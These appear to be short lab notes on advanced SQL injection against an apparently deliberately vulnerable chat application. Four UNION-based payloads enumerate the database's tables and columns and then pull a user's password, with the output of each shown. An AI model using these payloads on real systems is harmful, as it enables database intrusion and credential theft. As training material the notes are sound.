# SQL-Injection Advanced

information_schema: table_schema, table_name

' OR 1=1 UNION SELECT table_schema FROM information_schema.tables -- 
-> dvwc

' OR 1=1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'dvwc' -- 
-> Chatrooms, PoMessages, Users

' OR 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'Users' -- 
-> id, surname, prename, birthday, username, pwd, createdAt, updatedAt

' OR 1=1 UNION SELECT pwd FROM Users WHERE username = 'unionguy' -- 
-> sQL-iNJeCtion4EvERYonE
